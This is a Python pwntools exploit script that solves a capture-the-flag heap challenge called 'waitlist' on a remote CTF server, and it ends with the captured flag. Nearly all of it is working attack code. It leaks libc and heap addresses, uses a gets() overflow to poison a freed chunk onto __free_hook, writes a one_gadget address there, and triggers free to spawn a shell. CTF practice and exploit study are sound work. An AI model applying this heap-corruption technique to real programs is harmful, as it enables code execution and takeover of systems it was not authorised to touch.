from pwn import *

context.terminal = ('/mnt/c/WINDOWS/system32/cmd.exe', '/c','start', 'wsl.exe', '--', 'sudo', 'su', '-c')

local = False
gdb_bool = True

elf = context.binary = ELF('./waitlist_patched')

if not local:
    io = remote('ctf2.whitehats.site', 2005)
else:
    #io = process(["strace", "-o", "strace.out", "./EDIT"])

    io = elf.process(stdin=PTY)
    if gdb_bool == True:
        gdb.attach(io, '''b *main+96
                   ''')

libc = ELF('libc.so.6')

def join(name):
    io.recvuntil(b'>')
    io.sendline(b'1')
    io.sendline(name)

def view(index):
    io.recvuntil(b'>')
    io.sendline(b'2')
    io.sendline(index)

def leave(index):
    io.recvuntil(b'>')
    io.sendline(b'3')
    io.sendline(index)


'''
get aslr leak
'''

io.recvuntil(b'change your mind: ')
exit = int(io.recvline().strip())
print('exit:',hex(exit))

libc_base = exit - libc.sym.exit
libc.address = libc_base

print('libc_base:',hex(libc_base))


'''
we can get a leak of heap using 
create 0 create 1 leave 0 leave 1
then can leak using view 1
'''

join(b'AAAAA')
join(b'BBBBB')
join(b'CCCCC')
leave(b'0')
leave(b'2')
view(b'2')

io.recvuntil(b'Name: ')
leak = io.recvline().strip()
leak = int.from_bytes(leak, byteorder='little')
print(hex(leak))

pie = leak - (0x00005572da200000 - 0x5572db3aa260)#0xf6f260 # (0x557fcc06f260 - 0x0000557fcae00000) # may be wrong offset, may need to -0x9fa000
print('pie:',hex(pie))

print(hex(elf.sym.main))

'''
we can overwrite values because they use gets() for add

if we cld overwrite the rip, by changing the leak to rip it wld be really good
but we first need to leak aslr somehow

'''
leave(b'1')

target = libc.symbols['__free_hook']
print(hex(target))

payload = b'A'*0x18 + b'\x21' + b'\x00'*7 + p64(target)# + target address b'AAA'
join(payload)
join(b'/bin/sh\x00\x00')
# join(b'/bin/sh\x00\x00')
one_gadget = 0x4f302 + libc_base #0x10a2fc, 0x4f2a5
join(p64(one_gadget))


leave(b'5')
io.interactive()

# WH2024{w4ItIng_In_L1n3_f0r_c@t3g0ry_10K}
# HEAP EXPLOIT LEGGGO